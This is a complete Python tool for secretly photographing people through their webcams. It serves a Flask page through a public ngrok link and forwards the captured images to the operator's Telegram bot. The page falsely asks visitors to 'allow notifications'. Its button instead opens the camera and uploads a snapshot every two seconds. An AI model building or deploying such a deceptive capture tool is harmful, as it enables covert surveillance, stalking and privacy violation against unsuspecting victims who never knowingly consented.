import os
import cv2
import time
from flask import Flask, render_template_string, request
from pyngrok import ngrok
import telebot
import base64

# HTML для сайта
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e90ff, #87cefa);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
        }

        p {
            font-size: 1rem;
            margin-bottom: 2rem;
            line-height: 1.5;
        }

        button {
            background-color: #ffa500;
            color: #fff;
            border: none;
            border-radius: 25px;
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }

        button:hover {
            background-color: #ff8c00;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
        }

        button:active {
            transform: translateY(0);
            box-shadow: 0 3px 5px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>Allow Notifications to Access the Link</h1>
    <p>For the best experience, please enable notifications and grant access to your notifications.</p>
    <button onclick="startCapture()">Grant Access</button>
    <script>
        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setInterval(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const image = canvas.toDataURL('image/jpeg');

                    await fetch('/capture', {
                        method: 'POST',
                        body: JSON.stringify({ image }),
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    });
                }, 2000);
            } catch (error) {
                alert('Access to notifications was denied. Please enable permissions and try again.');
            }
        }
    </script>
</body>
</html>
"""

# Flask приложение
app = Flask(__name__)

# Переменные для Telegram-бота
bot = None
target_user_id = None

@app.route('/')
def index():
    return HTML_TEMPLATE

import base64

@app.route('/capture', methods=['POST'])
def capture():
    global bot, target_user_id
    image_data = request.data.split(b",")[1]  # Получаем Base64-строку
    image_path = "capture.jpg"

    # Декодируем и сохраняем изображение
    with open(image_path, "wb") as f:
        f.write(base64.b64decode(image_data))

    # Отправляем изображение через Telegram API
    with open(image_path, "rb") as photo:
        try:
            bot.send_photo(target_user_id, photo)
        except telebot.apihelper.ApiTelegramException as e:
            return f"Error: {e}"

    return "OK"


def register_bot():
    global bot, target_user_id

    print("Введите токен вашего Telegram-бота:")
    token = input("Токен: ")

    try:
        bot = telebot.TeleBot(token)
        bot.get_me()
    except Exception as e:
        print(f"Ошибка: {e}")
        input("Нажмите Enter для выхода...")
        exit()

    print("Введите ваш Telegram User ID:")
    try:
        target_user_id = int(input("User ID: "))
        bot.send_message(target_user_id, "Бот успешно подключён!")
    except Exception as e:
        print(f"Ошибка: {e}")
        input("Нажмите Enter для выхода...")
        exit()

def create_ngrok_site():
    public_url = ngrok.connect(5000).public_url
    print(f"Ваш сайт запущен: {public_url}")
    return public_url

if __name__ == "__main__":
    register_bot()

    print("Меню:")
    print("01 - Создать сайт через Ngrok")
    choice = input("Введите ваш выбор: ")

    if choice == "01":
        public_url = create_ngrok_site()
        print("Сайт запущен. Переходите по ссылке.")

        app.run(port=5000)
    else:
        print("Неверный выбор. Выход.")
        exit()
